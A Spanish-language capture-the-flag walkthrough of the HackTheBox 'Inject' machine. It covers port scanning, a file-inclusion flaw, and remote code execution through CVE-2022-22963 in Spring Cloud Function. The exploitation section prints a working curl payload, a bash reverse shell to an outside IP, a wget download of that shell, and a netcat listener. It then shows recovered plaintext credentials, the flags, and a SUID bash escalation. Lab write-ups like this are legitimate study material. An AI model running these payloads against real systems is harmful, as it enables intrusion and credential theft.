---
title: Inject HTB walkthrough
date: 2023-04-03
published: false
---

# Inject HTB walkthrough

## Reconocimiento

Comenzamos buscando puertos abiertos con nmap:

```java
sudo nmap -sS -p- --open --min-rate 5000 -n -Pn 10.10.11.204
```
```java
Not shown: 65223 closed ports, 310 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Aplicamos una búsqueda en profundidad de dichos puertos:

```java
sudo nmap -sVC -p22,8080 -n -Pn 10.10.11.204
```
```java
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos llama la atención el servicio del puerto `8080`, se trata de [[nagios]], un software de monitorización. Si tratamos de conectarnos por el navegador a `http://ip:8080`, nos encontramos una página web donde nos llama la atención una página de *uploads*, en la que sólo se admiten imágenes.

Tras probar varias cosas, descubrimos que existe una vulnerabilidad a [[LFI]] y [[directory traversal]] en el parámetro `img` de `http://ip/show-image?img=`. Utilizando [[burpsuite]] para mandar las peticiones y *url-encodear* el valor de `img`, podemos listar por ejemplo el `/etc/passwd`:

```txt
root:x:0:0:root:/root:/bin/bash
[...]
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

Donde vemos tres usuarios potenciales: `root`, `phil` y `frank`.

Sin embargo, no hay muchos más archivos del sistema a los que podamos acceder, por lo que accedemos a `/var/www` para tratar de buscar archivos de configuración de la propia aplicación web. Vemos el directorio `WebApp`, donde encontramos un archivo `pom.xml`:

```xml
[...]
<dependency>
	<groupId>org.springframework.cloud</groupId>
	<artifactId>spring-cloud-function-web</artifactId>
	<version>3.2.2</version>
</dependency>
[...]
```

Podemos identificar una versión desactualizada de *spring cloud*, la `3.2.2`, y con una rápida búsqueda en internet encontramos el siguiente CVE: [CVE-2022-22963](https://github.com/me2nuk/CVE-2022-22963).

## Explotación

La vuln permite Ejecución remota de comandos, mediante el envío de ciertas peticiones POST:

```bash
sudo curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("COMANDO")' --data-raw 'data' -v
```

De esta forma, podemos tratar de enviar una simple *reverse shell* (ver [[Reverse shells]]) en bash:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.68/1234 0>&1
```
```bash
#Montamos un server http en python en nuestra maquina
sudo python3 -m http.server 11111
```
```bash
#Ejecutamos el siguiete comando para descargarla en el servidor
wget http://nuestra-ip:11111/shell.sh -P /var/www/
```
```bash
#Nos ponemos en escucha en nuestra maquina con netcat
nc -lvnp 1234
```
```bash
#Y la ejecutamos con
bash /var/www/shell.sh
```

Y deberíamos recibir una *bash* por [[netcat]], con la sesión del usuario `frank`. En este punto podríamos aplicar un [[Tratamiento de la tty]] para mejorar la shell. Sin embargo lo importante es ir al `/home/frank` y acceder al directorio `.m2` y listar el `settings.xml`:

```bash
bash-5.0$ whoami
frank
bash-5.0$ cd
bash-5.0$ ls -la
total 164
drwxr-xr-x 6 frank frank   4096 Apr  4 16:19 .
drwxr-xr-x 4 root  root    4096 Feb  1 18:38 ..
lrwxrwxrwx 1 root  root       9 Jan 24 13:57 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank   3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank   4096 Feb  1 18:38 .cache
drwx------ 2 frank frank   4096 Apr  4 16:19 .gnupg
-rwxr-xr-x 1 frank frank 134168 Feb 16 23:02 linpeas.sh
drwxr-xr-x 3 frank frank   4096 Feb  1 18:38 .local
drwx------ 2 frank frank   4096 Feb  1 18:38 .m2
-rw-r--r-- 1 frank frank    807 Feb 25  2020 .profile
bash-5.0$ cd .m2
bash-5.0$ ls
settings.xml
bash-5.0$ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Entre otras cosas veremos las credenciales del usuario *phil* (`phil:DocPhillovestoInject123`).

Tras intentar conectarnos por ssh, vemos que no es posible, por lo que tratamos de *loguearnos* con `su`:

```bash
su phil
Password: DocPhillovestoInject123
bash-5.0$ whoami
phil
```

Ya podemos obtener la flag de usuario, entramos a `/home/phil/` y listamos el archivo `user.txt`:

```bash
bash-5.0$ cd
cd
bash-5.0$ ls
ls
user.txt
bash-5.0$ cat user.txt
cat user.txt
0ce94b47eb49d4c232a927f7309819b0
```

Enhorabuena! Ya tenemos la flag de usuario: `0ce94b47eb49d4c232a927f7309819b0`.

## Escalada de privilegios

Al buscar vias de escalar privilegios vemos que el binario de bash, `/bin/bash` tiene activado privilegios *SUID*, por lo que si ejecutamos `/bin/bash -p`, obtendremos una sesión como root. Ya podemos listar el contenido de `/root/root.txt` (`46160a960fef7eab6d493ff89743dc2f`). Enhorabuena! Has resuelto la máquina!

